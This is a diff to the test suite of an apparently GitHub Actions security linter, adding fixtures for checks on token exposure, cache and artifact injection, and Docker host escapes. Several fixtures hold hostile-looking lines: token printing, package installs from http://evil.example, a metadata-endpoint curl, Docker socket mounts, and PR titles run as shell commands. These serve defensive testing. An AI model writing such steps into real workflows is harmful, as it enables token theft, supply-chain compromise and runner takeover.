@@ -293,6 +293,17 @@ jobs:
         run: python -c "import os; print(os.environ.get('GITHUB_TOKEN', 'none'))"
 EOF
 
+assert_detects "check 7 flags Node console.log token exposure" "7" "Potential token exposure" <<'EOF'
+name: test
+on: push
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Debug
+        run: node -e "console.log(process.env.GITHUB_TOKEN)"
+EOF
+
 # --- Check 8: Overly broad permissions ---
 
 assert_detects "check 8 flags write-all permissions" "8" "write-all" <<'EOF'
@@ -710,6 +721,30 @@ jobs:
       - run: echo hello
 EOF
 
+assert_detects "check 24 flags write permissions on scalar pull_request trigger" "24" "write-capable token scopes" <<'EOF'
+name: test
+on: pull_request
+permissions:
+  contents: write
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo hello
+EOF
+
+assert_detects "check 24 flags write permissions on flow-style pull_request trigger" "24" "write-capable token scopes" <<'EOF'
+name: test
+on: [pull_request]
+permissions:
+  contents: write
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo hello
+EOF
+
 assert_detects "check 25 flags mutable container image references" "25" "without immutable @sha256 digests" <<'EOF'
 name: test
 on: push
@@ -732,6 +767,20 @@ jobs:
       image: ghcr.io/example/build-env@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
     steps:
       - uses: docker://alpine@sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+EOF
+
+assert_detects "check 25 flags container image from workflow input" "25" "without immutable @sha256 digests" <<'EOF'
+name: test
+on: workflow_dispatch
+permissions: read-all
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    container:
+      image: ${{ inputs.image }}
+    steps:
+      - run: echo build
 EOF
 
 assert_parallel_detects "parallel wrapper preserves new check output" "self-hosted runner" <<'EOF'
@@ -791,7 +840,7 @@ jobs:
     uses: ./.github/workflows/build.yaml
 EOF
 
-assert_detects "check 28 flags cache keys with attacker-controlled input" "28" "Cache key contains potentially attacker-controlled input" <<'EOF'
+assert_detects "check 28 flags cache keys with attacker-controlled input" "28" "Cache key/restore-keys/path contains potentially attacker-controlled input" <<'EOF'
 name: test
 on: workflow_dispatch
 jobs:
@@ -801,6 +850,37 @@ jobs:
       - uses: actions/cache@v4
         with:
           key: ${{ inputs.cache-key }}-deps
+EOF
+
+assert_detects "check 28 flags cache restore-keys with attacker-controlled input" "28" "Cache key/restore-keys/path contains potentially attacker-controlled input" <<'EOF'
+name: test
+on: pull_request
+permissions: read-all
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/cache@0c45773b6237508fd0a00a0b098d13079a9c308b
+        with:
+          path: node_modules
+          key: safe-${{ github.sha }}
+          restore-keys: ${{ github.event.pull_request.title }}
+EOF
+
+assert_detects "check 28 flags cache path with attacker-controlled input" "28" "Cache key/restore-keys/path contains potentially attacker-controlled input" <<'EOF'
+name: test
+on: pull_request
+permissions: read-all
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/cache@0c45773b6237508fd0a00a0b098d13079a9c308b
+        with:
+          path: ${{ github.event.pull_request.title }}
+          key: static-key-${{ github.sha }}
 EOF
 
 assert_clean "check 28 accepts cache keys with safe context" "28" <<'EOF'
@@ -815,7 +895,7 @@ jobs:
           key: ${{ github.sha }}-deps
 EOF
 
-assert_detects "check 29 flags artifact paths with expressions" "29" "Artifact path contains expression interpolation" <<'EOF'
+assert_detects "check 29 flags artifact paths with expressions" "29" "Artifact path/name/pattern contains expression interpolation" <<'EOF'
 name: test
 on: workflow_dispatch
 jobs:
@@ -825,6 +905,20 @@ jobs:
       - uses: actions/upload-artifact@v4
         with:
           path: ${{ inputs.artifact-path }}
+EOF
+
+assert_detects "check 29 flags artifact names with expressions" "29" "Artifact path/name/pattern contains expression interpolation" <<'EOF'
+name: test
+on: pull_request
+permissions: read-all
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/download-artifact@ea165f8d65b6e75b540449ecdda27a11b875b458
+        with:
+          name: ${{ github.event.pull_request.title }}
 EOF
 
 assert_clean "check 29 accepts hardcoded artifact paths" "29" <<'EOF'
@@ -839,7 +933,7 @@ jobs:
           path: ./build/
 EOF
 
-assert_detects "check 29 flags artifact paths with single-line on: workflow_dispatch" "29" "Artifact path contains expression interpolation" <<'EOF'
+assert_detects "check 29 flags artifact paths with single-line on: workflow_dispatch" "29" "Artifact path/name/pattern contains expression interpolation" <<'EOF'
 name: test
 on: workflow_dispatch
 jobs:
@@ -899,9 +993,25 @@ jobs:
       - run: echo hi
 EOF
 
-# --- Check 32: Expression interpolation in GITHUB_ENV/PATH/OUTPUT writes ---
+assert_detects "check 31 flags Docker socket container volume" "31" "host-sensitive path" <<'EOF'
+name: test
+on: push
+permissions: read-all
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    container:
+      image: ubuntu@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+      volumes:
+        - /var/run/docker.sock:/var/run/docker.sock
+    steps:
+      - run: echo hi
+EOF
 
-assert_detects "check 32 flags expression in GITHUB_ENV write" "32" "GITHUB_ENV/PATH/OUTPUT" <<'EOF'
+# --- Check 32: Expression interpolation in GITHUB_ENV/PATH/OUTPUT/STATE writes ---
+
+assert_detects "check 32 flags expression in GITHUB_ENV write" "32" "GITHUB_ENV/PATH/OUTPUT/STATE" <<'EOF'
 name: test
 on: pull_request
 jobs:
@@ -912,7 +1022,7 @@ jobs:
         run: echo "BRANCH=${{ github.head_ref }}" >> "$GITHUB_ENV"
 EOF
 
-assert_detects "check 32 flags expression in GITHUB_PATH write" "32" "GITHUB_ENV/PATH/OUTPUT" <<'EOF'
+assert_detects "check 32 flags expression in GITHUB_PATH write" "32" "GITHUB_ENV/PATH/OUTPUT/STATE" <<'EOF'
 name: test
 on:
   workflow_dispatch:
@@ -925,6 +1035,17 @@ jobs:
     steps:
       - name: Set path
         run: echo "${{ inputs.extra-path }}" >> "$GITHUB_PATH"
+EOF
+
+assert_detects "check 32 flags expression in GITHUB_STATE write" "32" "GITHUB_ENV/PATH/OUTPUT/STATE" <<'EOF'
+name: test
+on: pull_request
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Set state
+        run: echo "flag=${{ github.event.pull_request.title }}" >> "$GITHUB_STATE"
 EOF
 
 assert_clean "check 32 accepts shell variable in GITHUB_ENV write" "32" <<'EOF'
@@ -1039,6 +1160,18 @@ jobs:
     steps:
       - name: Deploy
         run: echo deploying
+EOF
+
+assert_detects "check 35 flags discussion_comment without auth gate" "35" "comment trigger has no author_association" <<'EOF'
+name: test
+on: discussion_comment
+permissions: read-all
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - run: echo triggered
 EOF
 
 # --- Check 36: working-directory with attacker-controlled expressions ---
@@ -1393,7 +1526,7 @@ EOF
 
 # --- Check 44: Attacker-controlled env vars written to GITHUB_ENV/PATH/OUTPUT ---
 
-assert_detects "check 44 flags attacker-controlled env var written to GITHUB_PATH" "44" "Attacker-controlled env var is written to GITHUB_ENV/PATH/OUTPUT" <<'EOF'
+assert_detects "check 44 flags attacker-controlled env var written to GITHUB_PATH" "44" "Attacker-controlled env var is written to GITHUB_ENV/PATH/OUTPUT/STATE" <<'EOF'
 name: test
 on:
   workflow_dispatch:
@@ -1409,6 +1542,20 @@ jobs:
       - env:
           EXTRA_PATH: ${{ inputs.extra-path }}
         run: echo "$EXTRA_PATH" >> "$GITHUB_PATH"
+EOF
+
+assert_detects "check 44 flags attacker-controlled env var written to GITHUB_STATE" "44" "Attacker-controlled env var is written to GITHUB_ENV/PATH/OUTPUT/STATE" <<'EOF'
+name: test
+on: pull_request
+permissions: read-all
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Set state
+        env:
+          VAL: ${{ github.event.pull_request.title }}
+        run: echo "flag=${VAL}" >> "${GITHUB_STATE}"
 EOF
 
 assert_clean "check 44 accepts validated path before GITHUB_PATH write" "44" <<'EOF'
@@ -1431,7 +1578,7 @@ jobs:
           printf '%s\n' "/opt/tools/bin" >> "$GITHUB_PATH"
 EOF
 
-assert_detects "check 44 flags env var written to GITHUB_PATH with single-line on: workflow_dispatch" "44" "Attacker-controlled env var is written to GITHUB_ENV/PATH/OUTPUT" <<'EOF'
+assert_detects "check 44 flags env var written to GITHUB_PATH with single-line on: workflow_dispatch" "44" "Attacker-controlled env var is written to GITHUB_ENV/PATH/OUTPUT/STATE" <<'EOF'
 name: test
 on: workflow_dispatch
 permissions:
@@ -2265,6 +2412,19 @@ jobs:
       - run: echo "hello"
 EOF
 
+assert_detects "check 70 flags scalar workflow_run with contents: write" "70" "workflow_run trigger with write permissions" << 'EOF'
+name: test
+on: workflow_run
+permissions:
+  contents: write
+jobs:
+  comment:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - run: echo "hello"
+EOF
+
 assert_detects "check 70 flags workflow_run with pull-requests: write only" "70" "workflow_run trigger with write permissions" << 'EOF'
 name: test
 on:
@@ -2403,6 +2563,18 @@ jobs:
       - run: pip install --index-url http://pypi.corp.example.com/simple/ mypackage
 EOF
 
+assert_detects "check 72 flags pip install with equals-form http index-url" "72" "Installs packages from an HTTP" << 'EOF'
+name: test
+on: push
+permissions: read-all
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - run: pip install --index-url=http://pypi.corp.example.com/simple/ mypackage
+EOF
+
 assert_detects "check 72 flags pip3 install with -i http://" "72" "HTTP (non-HTTPS) registry" << 'EOF'
 name: test
 on: push
@@ -2413,6 +2585,31 @@ jobs:
     timeout-minutes: 30
     steps:
       - run: pip3 install -i http://internal.pypi.example.com/simple/ mypackage
+EOF
+
+assert_detects "check 72 flags yarn install with http registry" "72" "HTTP (non-HTTPS) registry" << 'EOF'
+name: test
+on: push
+permissions: read-all
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - run: yarn install --registry http://evil.example
+EOF
+
+assert_detects "check 72 flags npm config http registry" "72" "HTTP (non-HTTPS) registry" << 'EOF'
+name: test
+on: push
+permissions: read-all
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - run: npm config set registry http://evil.example
+      - run: npm ci
 EOF
 
 assert_clean "check 72 accepts npm install with https registry" "72" << 'EOF'
@@ -2462,6 +2659,18 @@ jobs:
     timeout-minutes: 30
     steps:
       - run: docker run --network host ubuntu curl http://169.254.169.254/
+EOF
+
+assert_detects "check 73 flags docker run --network=host" "73" "can escape container isolation" << 'EOF'
+name: test
+on: push
+permissions: read-all
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - run: docker run --network=host ubuntu id
 EOF
 
 assert_detects "check 73 flags docker run --cap-add SYS_ADMIN" "73" "dangerous flag" << 'EOF'
@@ -2629,7 +2838,7 @@ EOF
 
 # --- Check 76: TLS certificate verification disabled ---
 
-assert_detects "check 76 flags curl -k" "76" "TLS" <<'EOF'
+assert_detects "check 76 flags curl -k" "76" "certificate verification is disabled" <<'EOF'
 name: test
 on: push
 permissions: read-all
@@ -2641,7 +2850,7 @@ jobs:
       - run: curl -k -Lo /tmp/tool https://builds.example.com/tool && chmod +x /tmp/tool
 EOF
 
-assert_detects "check 76 flags curl --insecure" "76" "TLS" <<'EOF'
+assert_detects "check 76 flags curl --insecure" "76" "certificate verification is disabled" <<'EOF'
 name: test
 on: push
 permissions: read-all
@@ -2653,7 +2862,19 @@ jobs:
       - run: curl --insecure -o artifact.tar.gz https://builds.example.com/artifact.tar.gz
 EOF
 
-assert_detects "check 76 flags wget --no-check-certificate" "76" "TLS" <<'EOF'
+assert_detects "check 76 flags curl combined short -k option" "76" "certificate verification is disabled" <<'EOF'
+name: test
+on: push
+permissions: read-all
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - run: curl -fsSkL https://repo.example.com/install.sh -o install.sh
+EOF
+
+assert_detects "check 76 flags wget --no-check-certificate" "76" "certificate verification is disabled" <<'EOF'
 name: test
 on: push
 permissions: read-all
@@ -2855,6 +3076,351 @@ jobs:
     timeout-minutes: 30
     steps:
       - run: pip install mypackage --no-index --extra-index-url https://private.registry.example.com/simple/
+EOF
+
+# --- Check 82: docker host namespace / Docker socket escape ---
+
+assert_detects "check 82 flags docker host pid namespace" "82" "runner host" <<'EOF'
+name: test
+on: push
+permissions: read-all
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - run: docker run --pid=host ubuntu:22.04 ps aux
+EOF
+
+assert_detects "check 82 flags docker socket mount" "82" "runner host" <<'EOF'
+name: test
+on: push
+permissions: read-all
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - run: docker run -v /var/run/docker.sock:/var/run/docker.sock ubuntu:22.04 docker ps
+EOF
+
+assert_clean "check 82 accepts ordinary workspace bind mount" "82" <<'EOF'
+name: test
+on: push
+permissions: read-all
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - run: docker run --rm -v "$PWD/out:/out" ubuntu:22.04 true
+EOF
+
+# --- Check 83: package manager TLS verification disabled ---
+
+assert_detects "check 83 flags pip --trusted-host" "83" "TLS verification is disabled" <<'EOF'
+name: test
+on: push
+permissions: read-all
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - run: pip install --trusted-host pypi.org --index-url https://pypi.org/simple mypackage
+EOF
+
+assert_detects "check 83 flags npm strict-ssl false" "83" "TLS verification is disabled" <<'EOF'
+name: test
+on: push
+permissions: read-all
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - run: npm config set strict-ssl false
+EOF
+
+assert_clean "check 83 accepts package installs with TLS verification enabled" "83" <<'EOF'
+name: test
+on: push
+permissions: read-all
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - run: pip install --index-url https://pypi.org/simple mypackage
+      - run: npm config set strict-ssl true
+EOF
+
+# --- Check 84: pull_request_target with gh pr checkout ---
+
+assert_detects "check 84 flags gh pr checkout in pull_request_target" "84" "gh pr checkout" <<'EOF'
+name: test
+on: pull_request_target
+permissions: read-all
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - name: Checkout PR with gh
+        env:
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+        run: gh pr checkout "$PR_NUMBER"
+      - run: make test
+EOF
+
+assert_clean "check 84 accepts gh pr checkout on unprivileged pull_request" "84" <<'EOF'
+name: test
+on: pull_request
+permissions: read-all
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - name: Checkout PR with gh
+        env:
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+        run: gh pr checkout "$PR_NUMBER"
+EOF
+
+# --- Check 85: attacker-controlled env var executed as shell command ---
+
+assert_detects "check 85 flags env var executed as shell command" "85" "env var is executed as a shell command" <<'EOF'
+name: test
+on: pull_request
+permissions: read-all
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - env:
+          CMD: ${{ github.event.pull_request.title }}
+        run: $CMD
+EOF
+
+assert_clean "check 85 accepts env var printed as data" "85" <<'EOF'
+name: test
+on: pull_request
+permissions: read-all
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - env:
+          CMD: ${{ github.event.pull_request.title }}
+        run: printf '%s\n' "$CMD"
+EOF
+
+assert_detects "check 85 flags sourced env var as shell code" "85" "env var is executed as a shell command" <<'EOF'
+name: test
+on: pull_request
+permissions: read-all
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - env:
+          SCRIPT: ${{ github.event.pull_request.head.ref }}
+        run: source "${SCRIPT}"
+EOF
+
+assert_detects "check 85 flags exec of env var as shell command" "85" "env var is executed as a shell command" <<'EOF'
+name: test
+on: pull_request
+permissions: read-all
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - env:
+          CMD: ${{ github.event.comment.body }}
+        run: exec "$CMD"
+EOF
+
+# --- Check 86: dynamic runs-on with attacker-controlled expression ---
+
+assert_detects "check 86 flags dynamic runs-on from workflow input" "86" "runs-on contains attacker-controlled expression" <<'EOF'
+name: test
+on: workflow_dispatch
+permissions: read-all
+jobs:
+  test:
+    runs-on: ${{ inputs.runner-label }}
+    timeout-minutes: 10
+    steps:
+      - run: echo hi
+EOF
+
+assert_detects "check 86 flags array runs-on from workflow input" "86" "runs-on contains attacker-controlled expression" <<'EOF'
+name: test
+on: workflow_dispatch
+permissions: read-all
+jobs:
+  test:
+    runs-on:
+      - ubuntu-latest
+      - ${{ inputs.runner-label }}
+    timeout-minutes: 10
+    steps:
+      - run: echo hi
+EOF
+
+assert_clean "check 86 accepts dynamic runs-on from repo vars" "86" <<'EOF'
+name: test
+on: push
+permissions: read-all
+jobs:
+  test:
+    runs-on: ${{ vars.RUNNER_LABEL }}
+    timeout-minutes: 10
+    steps:
+      - run: echo hi
+EOF
+
+# --- Check 87: dangerous or dynamic container options ---
+
+assert_detects "check 87 flags privileged container options" "87" "Container options include dangerous host-level flags" <<'EOF'
+name: test
+on: push
+permissions: read-all
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    container:
+      image: ubuntu@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+      options: --privileged
+    steps:
+      - run: id
+EOF
+
+assert_detects "check 87 flags dynamic container options" "87" "Container options include dangerous host-level flags" <<'EOF'
+name: test
+on: workflow_dispatch
+permissions: read-all
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    container:
+      image: alpine:3.20@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+      options: --volume ${{ inputs.mount }}:/work
+    steps:
+      - run: echo hi
+EOF
+
+assert_detects "check 87 flags block dynamic container options" "87" "Container options include dangerous host-level flags" <<'EOF'
+name: test
+on: workflow_dispatch
+permissions: read-all
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    container:
+      image: alpine:3.20@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+      options: |
+        --volume ${{ inputs.mount }}:/work
+    steps:
+      - run: echo hi
+EOF
+
+assert_clean "check 87 accepts benign static container options" "87" <<'EOF'
+name: test
+on: push
+permissions: read-all
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    container:
+      image: ubuntu@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+      options: --cpus 1
+    steps:
+      - run: id
+EOF
+
+# --- Check 88: action command/script inputs with attacker-controlled expressions ---
+
+assert_detects "check 88 flags action command input expression" "88" "Action command/script input contains attacker-controlled expression" <<'EOF'
+name: test
+on: pull_request
+permissions: read-all
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: nick-fields/retry@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+        with:
+          timeout_minutes: 1
+          max_attempts: 1
+          command: ${{ github.event.pull_request.title }}
+EOF
+
+assert_detects "check 88 flags block action script input expression" "88" "Action command/script input contains attacker-controlled expression" <<'EOF'
+name: test
+on: workflow_dispatch
+permissions: read-all
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: some/action@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+        with:
+          script: |
+            echo "${{ inputs.command }}"
+EOF
+
+assert_detects "check 88 flags action command input from job output" "88" "Action command/script input contains attacker-controlled expression" <<'EOF'
+name: test
+on: pull_request
+permissions: read-all
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    outputs:
+      shell-cmd: ${{ steps.gen.outputs.cmd }}
+    steps:
+      - id: gen
+        run: echo "cmd=make test" >> "$GITHUB_OUTPUT"
+  retry:
+    needs: build
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: nick-fields/retry@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+        with:
+          timeout_minutes: 1
+          max_attempts: 1
+          command: ${{ needs.build.outputs.shell-cmd }}
+EOF
+
+assert_clean "check 88 accepts action command input from static text" "88" <<'EOF'
+name: test
+on: push
+permissions: read-all
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: nick-fields/retry@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+        with:
+          timeout_minutes: 1
+          max_attempts: 1
+          command: npm test
 EOF
 
 printf '\n'
